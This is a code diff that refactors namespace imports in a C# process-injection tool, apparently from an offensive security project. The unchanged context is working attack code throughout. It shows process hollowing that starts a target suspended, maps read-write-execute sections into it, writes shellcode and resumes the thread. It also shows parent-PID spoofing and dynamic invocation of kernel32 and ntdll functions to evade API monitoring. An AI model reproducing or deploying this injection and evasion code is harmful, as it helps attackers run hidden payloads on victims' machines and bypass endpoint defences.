@@ -1,8 +1,10 @@
-﻿using ProcessInjection.DInvoke.Native;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using static ProcessInjection.Utils.Utils;
+using static ProcessInjection.Native.Structs;
+using static ProcessInjection.Native.Delegates;
+using static ProcessInjection.Native.Constants;
 
 namespace ProcessInjection.DInvoke
 {
@@ -56,20 +58,20 @@ namespace ProcessInjection.DInvoke
 
         public uint round_to_page(uint size)
         {
-            Structs.SYSTEM_INFO info = new Structs.SYSTEM_INFO();
+            SYSTEM_INFO info = new SYSTEM_INFO();
 
             var funcParams = new object[] {
                     info
                 };
 
-            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            DynamicInvoke.DynamicApiInvoke(
                 "kernel32.dll",
                 "GetSystemInfo",
-                typeof(DInvoke.Native.Delegates.GetSystemInfo),
+                typeof(GetSystemInfo),
                 ref funcParams,
                 true);
 
-            info = (Structs.SYSTEM_INFO)funcParams[0];
+            info = (SYSTEM_INFO)funcParams[0];
 
             return (info.dwPageSize - size % info.dwPageSize) + size;
         }
@@ -86,10 +88,10 @@ namespace ProcessInjection.DInvoke
 
             var funcParams = new object[] { };
 
-            var getCurrentProcess = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            var getCurrentProcess = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                 "kernel32.dll",
                 "GetCurrentProcess",
-                typeof(DInvoke.Native.Delegates.GetCurrentProcess),
+                typeof(GetCurrentProcess),
                 ref funcParams,
                 true);
 
@@ -97,15 +99,15 @@ namespace ProcessInjection.DInvoke
         }
 
 
-        public static Structs.PROCESS_INFORMATION StartProcess(string binaryPath)
+        public static PROCESS_INFORMATION StartProcess(string binaryPath)
         {
 
-            var procInfo = new Structs.PROCESS_INFORMATION();
+            var procInfo = new PROCESS_INFORMATION();
 
-            var siEx = new DInvoke.Native.Structs.STARTUPINFOEX();
+            var siEx = new STARTUPINFOEX();
 
-            var ps = new DInvoke.Native.Structs.SECURITY_ATTRIBUTES();
-            var ts = new DInvoke.Native.Structs.SECURITY_ATTRIBUTES();
+            var ps = new SECURITY_ATTRIBUTES();
+            var ts = new SECURITY_ATTRIBUTES();
 
             var funcParams = new object[]
                 {
@@ -114,21 +116,21 @@ namespace ProcessInjection.DInvoke
                     ps,
                     ts,
                     false,
-                    DInvoke.Native.Constants.CreateSuspended,
+                    CreateSuspended,
                     IntPtr.Zero,
                     null,
                     siEx,
                     procInfo
                 };
 
-            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            DynamicInvoke.DynamicApiInvoke(
                 "kernel32.dll",
                 "CreateProcessA",
-                typeof(DInvoke.Native.Delegates.CreateProcess),
+                typeof(CreateProcess),
                 ref funcParams,
                 true);
 
-            procInfo = (DInvoke.Native.Structs.PROCESS_INFORMATION)funcParams[9];
+            procInfo = (PROCESS_INFORMATION)funcParams[9];
 
             PrintInfo($"[!] Process {binaryPath} started with Process ID: {procInfo.dwProcessId}.");
 
@@ -141,7 +143,7 @@ namespace ProcessInjection.DInvoke
         */
         public bool CreateSection(uint size)
         {
-            Structs.LARGE_INTEGER liVal = new Structs.LARGE_INTEGER();
+            LARGE_INTEGER liVal = new LARGE_INTEGER();
             size_ = round_to_page(size);
             liVal.LowPart = size_;
 
@@ -155,10 +157,10 @@ namespace ProcessInjection.DInvoke
                 IntPtr.Zero
             };
 
-            var status = (int)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            var status = (int)DynamicInvoke.DynamicApiInvoke(
                 "ntdll.dll",
                 "ZwCreateSection",
-                typeof(DInvoke.Native.Delegates.ZwCreateSection),
+                typeof(ZwCreateSection),
                 ref funcParams,
                 true);
 
@@ -187,10 +189,10 @@ namespace ProcessInjection.DInvoke
                 protect
             };
 
-            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            DynamicInvoke.DynamicApiInvoke(
                 "ntdll.dll",
                 "ZwMapViewOfSection",
-                typeof(DInvoke.Native.Delegates.ZwMapViewOfSection),
+                typeof(ZwMapViewOfSection),
                 ref funcParams,
                 true);
             baseAddr = (IntPtr)funcParams[2];
@@ -305,7 +307,7 @@ namespace ProcessInjection.DInvoke
 
         public IntPtr FindEntry(IntPtr hProc)
         {
-            Structs.PROCESS_BASIC_INFORMATION basicInfo = new Structs.PROCESS_BASIC_INFORMATION();
+            PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();
             uint retLen = new uint();
 
             var funcParams = new object[] {
@@ -316,14 +318,14 @@ namespace ProcessInjection.DInvoke
                 retLen
             };
 
-            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            DynamicInvoke.DynamicApiInvoke(
                 "ntdll.dll",
                 "ZwQueryInformationProcess",
-                typeof(DInvoke.Native.Delegates.ZwQueryInformationProcess),
+                typeof(ZwQueryInformationProcess),
                 ref funcParams,
                 true);
 
-            basicInfo = (Structs.PROCESS_BASIC_INFORMATION)funcParams[2];
+            basicInfo = (PROCESS_BASIC_INFORMATION)funcParams[2];
 
 
             PrintInfo($"[!] Locating the module base address in the remote process.");
@@ -349,10 +351,10 @@ namespace ProcessInjection.DInvoke
                 nRead
             };
 
-            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            DynamicInvoke.DynamicApiInvoke(
                 "kernel32.dll",
                 "ReadProcessMemory",
-                typeof(DInvoke.Native.Delegates.ReadProcessMemory),
+                typeof(ReadProcessMemory),
                 ref funcParams,
                 true);
 
@@ -371,10 +373,10 @@ namespace ProcessInjection.DInvoke
                 nRead
             };
 
-            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            DynamicInvoke.DynamicApiInvoke(
                 "kernel32.dll",
                 "ReadProcessMemory",
-                typeof(DInvoke.Native.Delegates.ReadProcessMemory),
+                typeof(ReadProcessMemory),
                 ref funcParams,
                 true);
 
@@ -383,7 +385,7 @@ namespace ProcessInjection.DInvoke
             return GetEntryFromBuffer(inner_);
         }
 
-        public void MapAndStart(Structs.PROCESS_INFORMATION pInfo)
+        public void MapAndStart(PROCESS_INFORMATION pInfo)
         {
 
             KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
@@ -410,10 +412,10 @@ namespace ProcessInjection.DInvoke
                     tPtr
                 };
 
-                DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                DynamicInvoke.DynamicApiInvoke(
                     "kernel32.dll",
                     "WriteProcessMemory",
-                    typeof(DInvoke.Native.Delegates.WriteProcessMemoryPH),
+                    typeof(WriteProcessMemoryPH),
                     ref funcParams,
                     true);
 
@@ -436,10 +438,10 @@ namespace ProcessInjection.DInvoke
                 nRead
             };
 
-            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            DynamicInvoke.DynamicApiInvoke(
                 "kernel32.dll",
                 "ReadProcessMemory",
-                typeof(DInvoke.Native.Delegates.ReadProcessMemory),
+                typeof(ReadProcessMemory),
                 ref funcParams,
                 true);
 
@@ -447,10 +449,10 @@ namespace ProcessInjection.DInvoke
                         pInfo.hThread
                     };
 
-            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            DynamicInvoke.DynamicApiInvoke(
                 "kernel32.dll",
                 "ResumeThread",
-                typeof(DInvoke.Native.Delegates.ResumeThread),
+                typeof(ResumeThread),
                 ref funcParams,
                 true);
 
@@ -473,10 +475,10 @@ namespace ProcessInjection.DInvoke
                     localmap_
                 };
 
-                DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                DynamicInvoke.DynamicApiInvoke(
                     "ntdll.dll",
                     "ZwUnmapViewOfSection",
-                    typeof(DInvoke.Native.Delegates.ZwUnmapViewOfSection),
+                    typeof(ZwUnmapViewOfSection),
                     ref funcParams,
                     true);
             }
@@ -487,7 +489,7 @@ namespace ProcessInjection.DInvoke
         public void DynamicProcHollow(string binary, byte[] shellcode)
         {
 
-            Structs.PROCESS_INFORMATION pinf = StartProcess(binary);
+            PROCESS_INFORMATION pinf = StartProcess(binary);
             CreateSection((uint)shellcode.Length);
             FindEntry((IntPtr)pinf.hProcess);
             SetLocalSection((uint)shellcode.Length);
@@ -497,10 +499,10 @@ namespace ProcessInjection.DInvoke
                     pinf.hThread
                     };
 
-            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            DynamicInvoke.DynamicApiInvoke(
                 "kernel32.dll",
                 "CloseHandle",
-                typeof(DInvoke.Native.Delegates.CloseHandle),
+                typeof(CloseHandle),
                 ref funcParams,
                 true);
 
@@ -508,10 +510,10 @@ namespace ProcessInjection.DInvoke
                     pinf.hProcess
                     };
 
-            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            DynamicInvoke.DynamicApiInvoke(
                 "kernel32.dll",
                 "CloseHandle",
-                typeof(DInvoke.Native.Delegates.CloseHandle),
+                typeof(CloseHandle),
                 ref funcParams,
                 true);
         }
@@ -522,7 +524,7 @@ namespace ProcessInjection.DInvoke
         {
 
             DynamicPPIDSpoofing Parent = new DynamicPPIDSpoofing();
-            Structs.PROCESS_INFORMATION pinf = Parent.DynamicParentSpoofing(parentpid, binary);
+            PROCESS_INFORMATION pinf = Parent.DynamicParentSpoofing(parentpid, binary);
             DynamicProcessHollowing hollow = new DynamicProcessHollowing();
             hollow.CreateSection((uint)shellcode.Length);
             hollow.FindEntry(pinf.hProcess);
@@ -535,10 +537,10 @@ namespace ProcessInjection.DInvoke
                     pinf.hThread
                     };
 
-            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            DynamicInvoke.DynamicApiInvoke(
                 "kernel32.dll",
                 "CloseHandle",
-                typeof(DInvoke.Native.Delegates.CloseHandle),
+                typeof(CloseHandle),
                 ref funcParams,
                 true);
 
@@ -546,10 +548,10 @@ namespace ProcessInjection.DInvoke
                     pinf.hProcess
                     };
 
-            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            DynamicInvoke.DynamicApiInvoke(
                 "kernel32.dll",
                 "CloseHandle",
-                typeof(DInvoke.Native.Delegates.CloseHandle),
+                typeof(CloseHandle),
                 ref funcParams,
                 true);
 
